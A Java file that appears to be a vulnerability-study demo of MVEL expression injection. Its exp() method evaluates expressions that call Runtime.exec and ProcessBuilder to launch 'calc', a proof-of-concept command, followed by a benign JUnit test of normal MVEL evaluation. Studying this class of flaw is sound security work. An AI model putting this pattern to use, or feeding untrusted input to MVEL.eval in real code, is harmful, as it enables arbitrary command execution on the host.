package com.r17a.commonvuln.injection.expression.mvel;

import org.junit.Test;
import org.mvel2.MVEL;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

public class MvelTest {
    public static void main(String[] args) {
        new MvelTest().exp();
    }

    public void exp(){
        Map vars = new HashMap();
        String expression1 = "Runtime.getRuntime().exec(\"calc\")";
        Serializable serializable = MVEL.compileExpression(expression1);
        vars.put("1",expression1);
        MVEL.executeExpression(serializable,vars);

        String expression2 = "new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"}).start()";
        vars.put("2",expression2);
        MVEL.eval(expression2,vars);
    }

    @Test
    public void test(){
        // 两种方式
        String expression1 ="foobar > 99";
        Serializable compiled = MVEL.compileExpression(expression1);
        Map vars = new HashMap();
        vars.put("foobar",new Integer(100));

        Boolean result1 = (Boolean)MVEL.eval(expression1, vars);
        if (result1.booleanValue()) {
            System.out.println("Itworks!");
        }

        Boolean result2 = (Boolean)MVEL.executeExpression(compiled, vars);
                if (result2.booleanValue()) {
            System.out.println("Itworks2!");
        }


    }
}
